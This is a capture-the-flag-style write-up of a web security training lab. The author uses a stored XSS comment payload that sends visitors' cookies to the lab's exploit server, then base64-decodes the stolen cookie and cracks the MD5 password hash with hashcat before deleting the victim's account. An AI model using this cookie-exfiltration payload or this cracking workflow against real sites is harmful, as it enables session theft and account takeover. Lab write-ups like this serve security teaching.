# Lab: Offline password cracking

 Not solved

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos


# Step 1 login an walk the application:

![image](https://user-images.githubusercontent.com/83407557/208747778-1e37d65e-d631-4d60-8435-e5da067259e4.png)

I also want to view the exploit server that is provided by the lab (don't have to use burp collaborator for this one it would seem)

![image](https://user-images.githubusercontent.com/83407557/208748268-fd1d72d8-0d47-4ffd-8bcd-a6f7b1c9ffc6.png)


# Step 2 find a stored XXS vuln in the blog

![image](https://user-images.githubusercontent.com/83407557/208748546-29bd087a-b36e-4ddc-b54f-8c4dc14c41e0.png)

![image](https://user-images.githubusercontent.com/83407557/208748671-d5ea01cf-d247-475f-9fa8-d470070be57d.png)


# Step 3 use stored XXS to grab other user's cookies

Keeping in mind my attack servers url :https://exploit-0ab600f9031675a3c3975ab901c700d4.exploit-server.net/exploit

I form the following payload:
```html
<script>document.location='//exploit-0ab600f9031675a3c3975ab901c700d4.exploit-server.net/'+document.cookie</script>
```
![image](https://user-images.githubusercontent.com/83407557/208749583-22ef827f-9e7f-4713-bf60-ecce2be89fb3.png)

# Step 4 Checking my attack server's access logs

I find that a request was made containing my victem's cookies:

![image](https://user-images.githubusercontent.com/83407557/208750115-51ff8223-e590-4e21-b63e-d2c981492fb1.png)

# Step 5 decoding the stay logged in cookie

I find that the cookie is a base64 encoded string containing the username:hash of my victem:

```bash
└─$ echo Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz|base64 -d
carlos:26323c16d5f4dabff3bb136f2460a943
```

Using hash-identifier I find this is an MD5 hash

```bash
└─$ hash-identifier 26323c16d5f4dabff3bb136f2460a943                                                               
   #########################################################################                                       
   #     __  __                     __           ______    _____           #                                       
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #                                       
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #                                       
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #                                       
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #                                       
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #                                       
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #                                       
   #                                                             By Zion3R #                                       
   #                                                    www.Blackploit.com #                                       
   #                                                   Root@Blackploit.com #                                       
   #########################################################################                                       
--------------------------------------------------                                                                 
                                                                                                                   
Possible Hashs:                                                                                                    
[+] MD5                                                                                                            
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))   
```

# Step 6 cracking the MD5 password hash

First I want to save the hash to a file:

```bash
└─$ echo Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz|base64 -d|awk -F ':' '{print $2}'>hash
```
```bash
└─$ cat hash               
26323c16d5f4dabff3bb136f2460a943
```
Next I want to use a hash cracker like hashcat or john to try and crack this hash using a wordlist

```bash
└─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt      
```
![image](https://user-images.githubusercontent.com/83407557/208755594-dcaf7ac3-e2b8-444d-8a12-aa68e64fdc1b.png)

This tells me that the password is `onceuponatime`

(an alternate way to crack is to use a online rainbow table like [Crackstation](https://crackstation.net/) which will tell you the plaintext if the hash exists in thier database. This saves processing power on your local machine)

![image](https://user-images.githubusercontent.com/83407557/208756542-f9034e1e-7cde-4bfb-abe9-ed4de64a018a.png)


# Step 7 login to carlos and delete their account:

![image](https://user-images.githubusercontent.com/83407557/208755925-58d7cd74-b415-47a6-8b11-fcc80205781e.png)

![image](https://user-images.githubusercontent.com/83407557/208755997-8efeafaf-b113-455e-ab1d-72161d95d278.png)

![image](https://user-images.githubusercontent.com/83407557/208756055-54e787f9-a27f-41df-890f-a25d3a5822b2.png)

This solves the lab

![image](https://user-images.githubusercontent.com/83407557/208756099-6d44d4e9-a2d7-4e07-8936-639090decb51.png)


